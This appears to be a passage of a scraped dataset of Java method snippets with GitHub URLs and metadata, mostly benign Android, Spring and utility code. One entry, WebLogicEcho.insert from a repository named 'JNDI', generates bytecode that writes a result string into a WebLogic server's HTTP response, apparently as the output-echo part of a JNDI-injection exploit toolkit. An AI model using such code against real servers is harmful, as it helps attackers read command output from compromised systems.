//label.setTextSize(TypedValue.COMPLEX_UNIT_DIP, 24);\n        label.setText(headerItem.getName());\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/presenter/IconHeaderItemPresenter.java", "stars": "9", "class_props": {"extends": "RowHeaderPresenter", "implements": null, "modifiers": ["public"]}}, {"id": 58194, "method_name": "onUnbindViewHolder", "class_name": "IconHeaderItemPresenter", "params": ["Presenter"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onUnbindViewHolder(Presenter.ViewHolder viewHolder) {\n        // no op\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/presenter/IconHeaderItemPresenter.java", "stars": "9", "class_props": {"extends": "RowHeaderPresenter", "implements": null, "modifiers": ["public"]}}, {"id": 58195, "method_name": "onSelectLevelChanged", "class_name": "IconHeaderItemPresenter", "params": ["RowHeaderPresenter"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onSelectLevelChanged(RowHeaderPresenter.ViewHolder holder) {\n        //holder.view.setBackgroundColor(Color.GREEN);\n//        if (holder.getSelectLevel() == 1.0f) {\n//            holder.view.setBackgroundColor(holder.view.getResources().getColor(R.color.default_background_gray_selected));\n//            holder.view.setAlpha(0.5f);\n//        } else {\n//            holder.view.setBackgroundColor(Color.TRANSPARENT);\n//        }\n        holder.view.setAlpha(mUnselectedAlpha + holder.getSelectLevel() *\n                (1.0f - mUnselectedAlpha));\n\n\n    }", "url": "https://raw.githubusercontent.com/idanapp/IdanPlusPlus/master/app/src/main/java/com/example/idan/plusplus/presenter/IconHeaderItemPresenter.java", "stars": "9", "class_props": {"extends": "RowHeaderPresenter", "implements": null, "modifiers": ["public"]}}, {"id": 58196, "method_name": "main", "class_name": "BreakALoop", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void main(String[] args) {\n\t\t\n\t\tfor(int i = 0; i < 10; i++) {\n\t\t\tif(i == 3) {\n\t\t\t\t// when break keyword is used the program will exit from the loop\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tSystem.out.print(i + \" \");\n\t\t}\n\t\t\n\t\tSystem.out.println(\"\\n\");\n\t\tint count = 0;\n\t\twhile(count < 10) {\n\t\t\tif(count == 7) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\t\n\t\t\tSystem.out.print(count + \" \");\n\t\t\tcount++;\n\t\t}\t\n\t}", "url": "https://raw.githubusercontent.com/Suranchiyev/java-sdet-2020/master/src/day14/BreakALoop.java", "stars": "21", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 58197, "method_name": "getFieldOrder", "class_name": "HostInfo", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "List<String>", "snippet": "    protected List<String> getFieldOrder() {\n        return Arrays.asList(\"kernel_priority\", \"system_priority\", \"server_priority\", \"user_priority\", \"depress_priority\", \"idle_priority\", \"minimum_priority\", \"maximum_priority\");\n    }", "url": "https://raw.githubusercontent.com/wmm1996528/unidbg_douyin10/master/src/main/java/com/github/unidbg/ios/struct/kernel/HostInfo.java", "stars": "16", "class_props": {"extends": "UnicornStructure", "implements": null, "modifiers": ["public"]}}, {"id": 58198, "method_name": "execute", "class_name": "GeyserOffCommand", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void execute() {\n        // Turns OFF geyser\n    }", "url": "https://raw.githubusercontent.com/piyush6348/Design-Patterns/master/Command%20Pattern/src/Commands/GeyserOffCommand.java", "stars": "38", "class_props": {"extends": null, "implements": ["ICommand"], "modifiers": ["public"]}}, {"id": 58199, "method_name": "handleError", "class_name": "CustomResponseErrorHandler", "params": ["ClientHttpResponse"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "void", "snippet": "        public void handleError(ClientHttpResponse response) throws IOException {\n            log.error(\"Has error response: {}\", response);\n            super.handleError(response);\n        }", "url": "https://raw.githubusercontent.com/ihoneymon/rest-template-of-spring/master/client/src/main/java/io/honeymon/study/resttemplate/client/infrastructure/ServerClientRest.java", "stars": "4", "class_props": {"extends": "DefaultResponseErrorHandler", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58200, "method_name": "hasError", "class_name": "CustomResponseErrorHandler", "params": ["ClientHttpResponse"], "throws": ["IOException"], "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean hasError(ClientHttpResponse response) throws IOException {\n            log.error(\"Has error response: {}\", response);\n            return super.hasError(response);\n        }", "url": "https://raw.githubusercontent.com/ihoneymon/rest-template-of-spring/master/client/src/main/java/io/honeymon/study/resttemplate/client/infrastructure/ServerClientRest.java", "stars": "4", "class_props": {"extends": "DefaultResponseErrorHandler", "implements": null, "modifiers": ["public", "static"]}}, {"id": 58201, "method_name": "insert", "class_name": "WebLogicEcho", "params": ["String", "MethodVisitor"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void insert(String className, MethodVisitor mv) {\n\t\tLabel label0 = new Label();\n\t\tmv.visitLabel(label0);\n\t\tmv.visitLdcInsn(\"weblogic.work.ExecuteThread\");\n\t\tmv.visitMethodInsn(INVOKESTATIC, \"java/lang/Class\", \"forName\", \"(Ljava/lang/String;)Ljava/lang/Class;\", false);\n\t\tmv.visitVarInsn(ASTORE, 1);\n\t\tLabel label1 = new Label();\n\t\tmv.visitLabel(label1);\n\t\tmv.visitVarInsn(ALOAD, 1);\n\t\tmv.visitLdcInsn(\"getCurrentWork\");\n\t\tmv.visitInsn(ICONST_0);\n\t\tmv.visitTypeInsn(ANEWARRAY, \"java/lang/Class\");\n\t\tmv.visitMethodInsn(INVOKEVIRTUAL, \"java/lang/Class\", \"getDeclaredMethod\", \"(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;\", false);\n\t\tmv.visitVarInsn(ASTORE, 2);\n\t\tLabel label2 = new Label();\n\t\tmv.visitLabel(label2);\n\t\tmv.visitVarInsn(ALOAD, 2);\n\t\tmv.visitMethodInsn(INVOKESTATIC, \"java/lang/Thread\", \"currentThread\", \"()Ljava/lang/Thread;\", false);\n\t\tmv.visitInsn(ICONST_0);\n\t\tmv.visitTypeInsn(ANEWARRAY, \"java/lang/Object\");\n\t\tmv.visitMethodInsn(INVOKEVIRTUAL, \"java/lang/reflect/Method\", \"invoke\", \"(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;\", false);\n\t\tmv.visitVarInsn(ASTORE, 3);\n\t\tLabel label3 = new Label();\n\t\tmv.visitLabel(label3);\n\t\tmv.visitLdcInsn(\"weblogic.servlet.internal.ServletRequestImpl\");\n\t\tmv.visitMethodInsn(INVOKESTATIC, \"java/lang/Class\", \"forName\", \"(Ljava/lang/String;)Ljava/lang/Class;\", false);\n\t\tmv.visitVarInsn(ASTORE, 4);\n\t\tLabel label4 = new Label();\n\t\tmv.visitLabel(label4);\n\t\tmv.visitVarInsn(ALOAD, 4);\n\t\tmv.visitLdcInsn(\"getResponse\");\n\t\tmv.visitInsn(ICONST_0);\n\t\tmv.visitTypeInsn(ANEWARRAY, \"java/lang/Class\");\n\t\tmv.visitMethodInsn(INVOKEVIRTUAL, \"java/lang/Class\", \"getDeclaredMethod\", \"(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;\", false);\n\t\tmv.visitVarInsn(ASTORE, 5);\n\t\tLabel label5 = new Label();\n\t\tmv.visitLabel(label5);\n\t\tmv.visitVarInsn(ALOAD, 5);\n\t\tmv.visitVarInsn(ALOAD, 3);\n\t\tmv.visitInsn(ICONST_0);\n\t\tmv.visitTypeInsn(ANEWARRAY, \"java/lang/Object\");\n\t\tmv.visitMethodInsn(INVOKEVIRTUAL, \"java/lang/reflect/Method\", \"invoke\", \"(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;\", false);\n\t\tmv.visitVarInsn(ASTORE, 6);\n\t\tLabel label6 = new Label();\n\t\tmv.visitLabel(label6);\n\t\tmv.visitLdcInsn(\"weblogic.servlet.internal.ServletResponseImpl\");\n\t\tmv.visitMethodInsn(INVOKESTATIC, \"java/lang/Class\", \"forName\", \"(Ljava/lang/String;)Ljava/lang/Class;\", false);\n\t\tmv.visitVarInsn(ASTORE, 7);\n\t\tLabel label7 = new Label();\n\t\tmv.visitLabel(label7);\n\t\tmv.visitVarInsn(ALOAD, 7);\n\t\tmv.visitLdcInsn(\"getServletOutputStream\");\n\t\tmv.visitInsn(ICONST_0);\n\t\tmv.visitTypeInsn(ANEWARRAY, \"java/lang/Class\");\n\t\tmv.visitMethodInsn(INVOKEVIRTUAL, \"java/lang/Class\", \"getDeclaredMethod\", \"(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;\", false);\n\t\tmv.visitVarInsn(ASTORE, 8);\n\t\tLabel label8 = new Label();\n\t\tmv.visitLabel(label8);\n\t\tmv.visitVarInsn(ALOAD, 8);\n\t\tmv.visitVarInsn(ALOAD, 6);\n\t\tmv.visitInsn(ICONST_0);\n\t\tmv.visitTypeInsn(ANEWARRAY, \"java/lang/Object\");\n\t\tmv.visitMethodInsn(INVOKEVIRTUAL, \"java/lang/reflect/Method\", \"invoke\", \"(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;\", false);\n\t\tmv.visitVarInsn(ASTORE, 9);\n\t\tLabel label9 = new Label();\n\t\tmv.visitLabel(label9);\n\t\tmv.visitLdcInsn(\"weblogic.xml.util.StringInputStream\");\n\t\tmv.visitMethodInsn(INVOKESTATIC, \"java/lang/Class\", \"forName\", \"(Ljava/lang/String;)Ljava/lang/Class;\", false);\n\t\tmv.visitVarInsn(ASTORE, 10);\n\t\tLabel label10 = new Label();\n\t\tmv.visitLabel(label10);\n\t\tmv.visitVarInsn(ALOAD, 10);\n\t\tmv.visitInsn(ICONST_1);\n\t\tmv.visitTypeInsn(ANEWARRAY, \"java/lang/Class\");\n\t\tmv.visitInsn(DUP);\n\t\tmv.visitInsn(ICONST_0);\n\t\tmv.visitLdcInsn(Type.getType(\"Ljava/lang/String;\"));\n\t\tmv.visitInsn(AASTORE);\n\t\tmv.visitMethodInsn(INVOKEVIRTUAL, \"java/lang/Class\", \"getConstructor\", \"([Ljava/lang/Class;)Ljava/lang/reflect/Constructor;\", false);\n\t\tmv.visitVarInsn(ASTORE, 11);\n\t\tLabel label11 = new Label();\n\t\tmv.visitLabel(label11);\n\t\tmv.visitVarInsn(ALOAD, 11);\n\t\tmv.visitInsn(ICONST_1);\n\t\tmv.visitTypeInsn(ANEWARRAY, \"java/lang/Object\");\n\t\tmv.visitInsn(DUP);\n\t\tmv.visitInsn(ICONST_0);\n\t\tmv.visitVarInsn(ALOAD, 0);\n\t\tmv.visitFieldInsn(GETFIELD, className, \"result\", \"Ljava/lang/String;\");\n\t\tmv.visitInsn(AASTORE);\n\t\tmv.visitMethodInsn(INVOKEVIRTUAL, \"java/lang/reflect/Constructor\", \"newInstance\", \"([Ljava/lang/Object;)Ljava/lang/Object;\", false);\n\t\tmv.visitVarInsn(ASTORE, 12);\n\t\tLabel label12 = new Label();\n\t\tmv.visitLabel(label12);\n\t\tmv.visitLdcInsn(\"weblogic.servlet.internal.ServletOutputStreamImpl\");\n\t\tmv.visitMethodInsn(INVOKESTATIC, \"java/lang/Class\", \"forName\", \"(Ljava/lang/String;)Ljava/lang/Class;\", false);\n\t\tmv.visitVarInsn(ASTORE, 13);\n\t\tLabel label13 = new Label();\n\t\tmv.visitLabel(label13);\n\t\tmv.visitVarInsn(ALOAD, 13);\n\t\tmv.visitLdcInsn(\"writeStream\");\n\t\tmv.visitInsn(ICONST_1);\n\t\tmv.visitTypeInsn(ANEWARRAY, \"java/lang/Class\");\n\t\tmv.visitInsn(DUP);\n\t\tmv.visitInsn(ICONST_0);\n\t\tmv.visitVarInsn(ALOAD, 10);\n\t\tmv.visitInsn(AASTORE);\n\t\tmv.visitMethodInsn(INVOKEVIRTUAL, \"java/lang/Class\", \"getDeclaredMethod\", \"(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;\", false);\n\t\tmv.visitVarInsn(ASTORE, 14);\n\t\tLabel label14 = new Label();\n\t\tmv.visitLabel(label14);\n\t\tmv.visitVarInsn(ALOAD, 14);\n\t\tmv.visitVarInsn(ALOAD, 9);\n\t\tmv.visitInsn(ICONST_1);\n\t\tmv.visitTypeInsn(ANEWARRAY, \"java/lang/Object\");\n\t\tmv.visitInsn(DUP);\n\t\tmv.visitInsn(ICONST_0);\n\t\tmv.visitVarInsn(ALOAD, 12);\n\t\tmv.visitInsn(AASTORE);\n\t\tmv.visitMethodInsn(INVOKEVIRTUAL, \"java/lang/reflect/Method\", \"invoke\", \"(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;\", false);\n\t\tmv.visitInsn(POP);\n\t\tLabel label15 = new Label();\n\t\tmv.visitLabel(label15);\n\t\tmv.visitVarInsn(ALOAD, 13);\n\t\tmv.visitLdcInsn(\"flush\");\n\t\tmv.visitInsn(ICONST_0);\n\t\tmv.visitTypeInsn(ANEWARRAY, \"java/lang/Class\");\n\t\tmv.visitMethodInsn(INVOKEVIRTUAL, \"java/lang/Class\", \"getDeclaredMethod\", \"(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;\", false);\n\t\tmv.visitVarInsn(ASTORE, 15);\n\t\tLabel label16 = new Label();\n\t\tmv.visitLabel(label16);\n\t\tmv.visitVarInsn(ALOAD, 15);\n\t\tmv.visitVarInsn(ALOAD, 9);\n\t\tmv.visitInsn(ICONST_0);\n\t\tmv.visitTypeInsn(ANEWARRAY, \"java/lang/Object\");\n\t\tmv.visitMethodInsn(INVOKEVIRTUAL, \"java/lang/reflect/Method\", \"invoke\", \"(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;\", false);\n\t\tmv.visitInsn(POP);\n\t\tLabel label17 = new Label();\n\t\tmv.visitLabel(label17);\n\t\tmv.visitVarInsn(ALOAD, 7);\n\t\tmv.visitLdcInsn(\"getWriter\");\n\t\tmv.visitInsn(ICONST_0);\n\t\tmv.visitTypeInsn(ANEWARRAY, \"java/lang/Class\");\n\t\tmv.visitMethodInsn(INVOKEVIRTUAL, \"java/lang/Class\", \"getDeclaredMethod\", \"(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;\", false);\n\t\tmv.visitVarInsn(ASTORE, 16);\n\t\tLabel label18 = new Label();\n\t\tmv.visitLabel(label18);\n\t\tmv.visitVarInsn(ALOAD, 16);\n\t\tmv.visitVarInsn(ALOAD, 6);\n\t\tmv.visitInsn(ICONST_0);\n\t\tmv.visitTypeInsn(ANEWARRAY, \"java/lang/Object\");\n\t\tmv.visitMethodInsn(INVOKEVIRTUAL, \"java/lang/reflect/Method\", \"invoke\", \"(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;\", false);\n\t\tmv.visitVarInsn(ASTORE, 17);\n\t\tLabel label19 = new Label();\n\t\tmv.visitLabel(label19);\n\t\tmv.visitLdcInsn(\"java.io.PrintWriter\");\n\t\tmv.visitMethodInsn(INVOKESTATIC, \"java/lang/Class\", \"forName\", \"(Ljava/lang/String;)Ljava/lang/Class;\", false);\n\t\tmv.visitVarInsn(ASTORE, 18);\n\t\tLabel label20 = new Label();\n\t\tmv.visitLabel(label20);\n\t\tmv.visitVarInsn(ALOAD, 18);\n\t\tmv.visitLdcInsn(\"write\");\n\t\tmv.visitInsn(ICONST_1);\n\t\tmv.visitTypeInsn(ANEWARRAY, \"java/lang/Class\");\n\t\tmv.visitInsn(DUP);\n\t\tmv.visitInsn(ICONST_0);\n\t\tmv.visitLdcInsn(Type.getType(\"Ljava/lang/String;\"));\n\t\tmv.visitInsn(AASTORE);\n\t\tmv.visitMethodInsn(INVOKEVIRTUAL, \"java/lang/Class\", \"getDeclaredMethod\", \"(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;\", false);\n\t\tmv.visitVarInsn(ASTORE, 19);\n\t\tLabel label21 = new Label();\n\t\tmv.visitLabel(label21);\n\t\tmv.visitVarInsn(ALOAD, 19);\n\t\tmv.visitVarInsn(ALOAD, 17);\n\t\tmv.visitInsn(ICONST_1);\n\t\tmv.visitTypeInsn(ANEWARRAY, \"java/lang/Object\");\n\t\tmv.visitInsn(DUP);\n\t\tmv.visitInsn(ICONST_0);\n\t\tmv.visitLdcInsn(\"\");\n\t\tmv.visitInsn(AASTORE);\n\t\tmv.visitMethodInsn(INVOKEVIRTUAL, \"java/lang/reflect/Method\", \"invoke\", \"(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;\", false);\n\t\tmv.visitInsn(POP);\n\t\tLabel label22 = new Label();\n\t\tmv.visitLabel(label22);\n\t\tmv.visitInsn(RETURN);\n\t\tLabel label23 = new Label();\n\t\tmv.visitLabel(label23);\n\t\tmv.visitLocalVariable(\"this\", \"L\"+className+\";\", null, label0, label23, 0);\n\t\tmv.visitLocalVariable(\"executeThread\", \"Ljava/lang/Class;\", \"Ljava/lang/Class<*>;\", label1, label23, 1);\n\t\tmv.visitLocalVariable(\"m\", \"Ljava/lang/reflect/Method;\", null, label2, label23, 2);\n\t\tmv.visitLocalVariable(\"currentWork\", \"Ljava/lang/Object;\", null, label3, label23, 3);\n\t\tmv.visitLocalVariable(\"servletRequestImpl\", \"Ljava/lang/Class;\", \"Ljava/lang/Class<*>;\", label4, label23, 4);\n\t\tmv.visitLocalVariable(\"m2\", \"Ljava/lang/reflect/Method;\", null, label5, label23, 5);\n\t\tmv.visitLocalVariable(\"response\", \"Ljava/lang/Object;\", null, label6, label23, 6);\n\t\tmv.visitLocalVariable(\"servletResponseImpl\", \"Ljava/lang/Class;\", \"Ljava/lang/Class<*>;\", label7, label23, 7);\n\t\tmv.visitLocalVariable(\"m3\", \"Ljava/lang/reflect/Method;\", null, label8, label23, 8);\n\t\tmv.visitLocalVariable(\"outputStream\", \"Ljava/lang/Object;\", null, label9, label23, 9);\n\t\tmv.visitLocalVariable(\"stringInputStream\", \"Ljava/lang/Class;\", \"Ljava/lang/Class<*>;\", label10, label23, 10);\n\t\tmv.visitLocalVariable(\"m5\", \"Ljava/lang/reflect/Constructor;\", \"Ljava/lang/reflect/Constructor<*>;\", label11, label23, 11);\n\t\tmv.visitLocalVariable(\"resultStream\", \"Ljava/lang/Object;\", null, label12, label23, 12);\n\t\tmv.visitLocalVariable(\"servletOutputStreamImpl\", \"Ljava/lang/Class;\", \"Ljava/lang/Class<*>;\", label13, label23, 13);\n\t\tmv.visitLocalVariable(\"m4\", \"Ljava/lang/reflect/Method;\", null, label14, label23, 14);\n\t\tmv.visitLocalVariable(\"m6\", \"Ljava/lang/reflect/Method;\", null, label16, label23, 15);\n\t\tmv.visitLocalVariable(\"m7\", \"Ljava/lang/reflect/Method;\", null, label18, label23, 16);\n\t\tmv.visitLocalVariable(\"writer\", \"Ljava/lang/Object;\", null, label19, label23, 17);\n\t\tmv.visitLocalVariable(\"printWriter\", \"Ljava/lang/Class;\", \"Ljava/lang/Class<*>;\", label20, label23, 18);\n\t\tmv.visitLocalVariable(\"m8\", \"Ljava/lang/reflect/Method;\", null, label21, label23, 19);\n\n\t}", "url": "https://raw.githubusercontent.com/JosephTribbianni/JNDI/master/src/main/java/org/su18/asm/echo/WebLogicEcho.java", "stars": "165", "class_props": {"extends": null, "implements": ["Opcodes"], "modifiers": ["public"]}}, {"id": 58202, "method_name": "getMin", "class_name": "RangeObservation", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getMin() {\n        return min;\n    }", "url": "https://raw.githubusercontent.com/mjtb49/LattiCG/master/src/randomreverser/reversal/observation/RangeObservation.java", "stars": "14", "class_props": {"extends": "Observation", "implements": null, "modifiers": ["public"]}}, {"id": 58203, "method_name": "getMax", "class_name": "RangeObservation", "params": [], "throws": null, "modifiers": ["public"], "return_type": "long", "snippet": "    public long getMax() {\n        return max;\n    }", "url": "https://raw.githubusercontent.com/mjtb49/LattiCG/master/src/randomreverser/reversal/observation/RangeObservation.java", "stars": "14", "class_props": {"extends": "Observation", "implements": null, "modifiers": ["public"]}}, {"id": 58204, "method_name": "readOperands", "class_name": "RangeObservation", "params": ["StringParser"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void readOperands(StringParser parser) {\n        min = parser.consumeInteger().getFirst().longValue();\n        max = parser.consumeInteger().getFirst().longValue();\n    }", "url": "https://raw.githubusercontent.com/mjtb49/LattiCG/master/src/randomreverser/reversal/observation/RangeObservation.java", "stars": "14", "class_props": {"extends": "Observation", "implements": null, "modifiers": ["public"]}}, {"id": 58205, "method_name": "writeOperands", "class_name": "RangeObservation", "params": ["StringBuilder", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void writeOperands(StringBuilder output, boolean verbose) {\n        if (verbose) {\n            output.append(\"/* min = */ \");\n        }\n        output.append(min).append(\" \");\n        if (verbose) {\n            output.append(\"/* max = */ \");\n        }\n        output.append(max);\n    }", "url": "https://raw.githubusercontent.com/mjtb49/LattiCG/master/src/randomreverser/reversal/observation/RangeObservation.java", "stars": "14", "class_props": {"extends": "Observation", "implements": null, "modifiers": ["public"]}}, {"id": 58206, "method_name": "run", "class_name": "TaskGroupContainerRunner", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void run() {\n        try {\n            Thread.currentThread().setName(\n                    String.format(\"taskGroup-%d\", this.taskGroupContainer.getTaskGroupId()));\n            this.taskGroupContainer.start();\n            this.state = State.SUCCEEDED;\n        } catch (Throwable e) {\n            this.state = State.FAILED;\n            throw DataXException.asDataXException(\n                    FrameworkErrorCode.RUNTIME_ERROR, e);\n        }\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/taskgroup/runner/TaskGroupContainerRunner.java", "stars": "23", "class_props": {"extends": null, "implements": ["Runnable"], "modifiers": ["public"]}}, {"id": 58207, "method_name": "getTaskGroupContainer", "class_name": "TaskGroupContainerRunner", "params": [], "throws": null, "modifiers": ["public"], "return_type": "TaskGroupContainer", "snippet": "    public TaskGroupContainer getTaskGroupContainer() {\n        return taskGroupContainer;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/taskgroup/runner/TaskGroupContainerRunner.java", "stars": "23", "class_props": {"extends": null, "implements": ["Runnable"], "modifiers": ["public"]}}, {"id": 58208, "method_name": "getState", "class_name": "TaskGroupContainerRunner", "params": [], "throws": null, "modifiers": ["public"], "return_type": "State", "snippet": "    public State getState() {\n        return state;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/taskgroup/runner/TaskGroupContainerRunner.java", "stars": "23", "class_props": {"extends": null, "implements": ["Runnable"], "modifiers": ["public"]}}, {"id": 58209, "method_name": "setState", "class_name": "TaskGroupContainerRunner", "params": ["State"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setState(State state) {\n        this.state = state;\n    }", "url": "https://raw.githubusercontent.com/WeBankFinTech/Exchangis/master/modules/executor/engine/datax/datax-core/src/main/java/com/alibaba/datax/core/taskgroup/runner/TaskGroupContainerRunner.java", "stars": "23", "class_props": {"extends": null, "implements": ["Runnable"], "modifiers": ["public"]}}, {"id": 58210, "method_name": "setHomeAction", "class_name": "ActionBar", "params": ["Action"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setHomeAction(Action action) {\n        mHomeBtn.setOnClickListener(this);\n        mHomeBtn.setTag(action);\n        mHomeBtn.setImageResource(action.getDrawable());\n        mHomeLayout.setVisibility(View.VISIBLE);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 58211, "method_name": "clearHomeAction", "class_name": "ActionBar", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clearHomeAction() {\n        mHomeLayout.setVisibility(View.GONE);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 58212, "method_name": "setHomeLogo", "class_name": "ActionBar", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setHomeLogo(int resId) {\n        // TODO: Add possibility to add an IntentAction as well.\n        mLogoView.setImageResource(resId);\n        mLogoView.setVisibility(View.VISIBLE);\n        mHomeLayout.setVisibility(View.GONE);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 58213, "method_name": "setDisplayHomeAsUpEnabled", "class_name": "ActionBar", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDisplayHomeAsUpEnabled(boolean show) {\n        mBackIndicator.setVisibility(show? View.VISIBLE : View.GONE);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 58214, "method_name": "setTitle", "class_name": "ActionBar", "params": ["CharSequence"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTitle(CharSequence title) {\n        mTitleView.setText(title);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 58215, "method_name": "setTitle", "class_name": "ActionBar", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setTitle(int resid) {\n        mTitleView.setText(resid);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 58216, "method_name": "setProgressBarVisibility", "class_name": "ActionBar", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setProgressBarVisibility(int visibility) {\n        mProgress.setVisibility(visibility);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 58217, "method_name": "getProgressBarVisibility", "class_name": "ActionBar", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getProgressBarVisibility() {\n        return mProgress.getVisibility();\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 58218, "method_name": "setOnTitleClickListener", "class_name": "ActionBar", "params": ["OnClickListener"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOnTitleClickListener(OnClickListener listener) {\n        mTitleView.setOnClickListener(listener);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 58219, "method_name": "onClick", "class_name": "ActionBar", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onClick(View view) {\n        final Object tag = view.getTag();\n        if (tag instanceof Action) {\n            final Action action = (Action) tag;\n            action.performAction(view);\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 58220, "method_name": "addActions", "class_name": "ActionBar", "params": ["ActionList"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addActions(ActionList actionList) {\n        int actions = actionList.size();\n        for (int i = 0; i < actions; i++) {\n            addAction(actionList.get(i));\n        }\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 58221, "method_name": "addAction", "class_name": "ActionBar", "params": ["Action"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void addAction(Action action) {\n        final int index = mActionsView.getChildCount();\n        addAction(action, index);\n    }", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/android-actionbar-master/actionbar/src/com/markupartist/android/widget/ActionBar.java", "stars": "74", "class_props": {"extends": "RelativeLayout", "implements": ["OnClickListener"], "modifiers": ["public"]}}, {"id": 58222, 